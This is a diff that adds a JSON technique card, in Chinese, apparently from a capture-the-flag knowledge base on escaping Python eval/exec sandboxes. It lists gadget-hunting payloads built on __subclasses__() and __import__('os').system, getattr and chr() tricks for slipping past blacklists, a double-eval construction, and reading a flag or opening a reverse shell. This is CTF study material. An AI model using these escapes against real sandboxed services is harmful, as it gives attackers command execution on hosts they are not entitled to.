@@ -1,0 +1,54 @@
+{
+ "id": "pyjail-escape",
+ "title": "Python 沙箱逃逸（pyjail）",
+ "vuln_pattern": "受限 eval/exec 环境，绕过黑名单从内建/对象图取回 os.system/读文件",
+ "fingerprint": [
+  "pyjail",
+  "sandbox",
+  "eval(",
+  "exec(",
+  "在线代码执行",
+  "逃逸",
+  "restricted",
+  "blacklist",
+  "builtins",
+  "字符集白名单",
+  "charset whitelist",
+  "双重eval",
+  "double eval",
+  "符号白名单"
+ ],
+ "exploit_steps": [
+  "枚举限制：哪些字符/关键字被禁(import/os/./_/引号/空格)、builtins 是否被清",
+  "从对象图找 gadget：().__class__.__base__.__subclasses__() 里找到含 os/popen 的类；或用 __import__",
+  "字符受限时用等价构造：getattr、chr()拼接、[].__class__、f-string、八进制/unicode 转义绕过黑名单",
+  "取到执行原语后 读 flag 或反弹"
+ ],
+ "key_payloads": [
+  "().__class__.__bases__[0].__subclasses__()  # 枚举可用类",
+  "__import__('os').system('cat /flag*')",
+  "getattr(__import__('os'),'system')('id')  # 绕点号/名字过滤",
+  "[c for c in ().__class__.__base__.__subclasses__() if 'popen' in str(c).lower()]",
+  "# 纯符号构造字符串(无字母无引号时的思路示例)\n# '\"'()*+/:=> 等符号经算术/比较/重复得到 chr 或布尔, 再乘出整条 payload 串\n# 双重 eval: 内层算出字符串字面量 -> 外层 eval 执行之"
+ ],
+ "category": "misc",
+ "cve": [],
+ "tags": [
+  "misc",
+  "pyjail",
+  "sandbox-escape",
+  "evasion"
+ ],
+ "source": "original: v2 technique card",
+ "created_ts": 0.0,
+ "preconditions": [
+  "能提交被 eval/exec 的 Python 片段，但有字符/名字黑名单或删了 builtins"
+ ],
+ "verify_oracle": "flag 内容/命令回显出现在输出；或成功列出含 popen/os 的子类",
+ "pitfalls": [
+  "subclasses() 索引随版本变——用过滤而非硬编码索引",
+  "禁了引号用 chr()/bytes 构造；禁了下划线用 getattr 链",
+  "builtins 被删可从 frame/generator 找回",
+  "字符集白名单(只允许极少符号字符)+双重 eval:内层 eval 只需产出一个字符串、外层 eval 才执行——用白名单字符的四则/重复运算构造目标串('*'乘法拼长度、字符串比较运算当布尔),40000 字符上限就是给你拼长串用的;别找字母,白名单里没有"
+ ]
+}
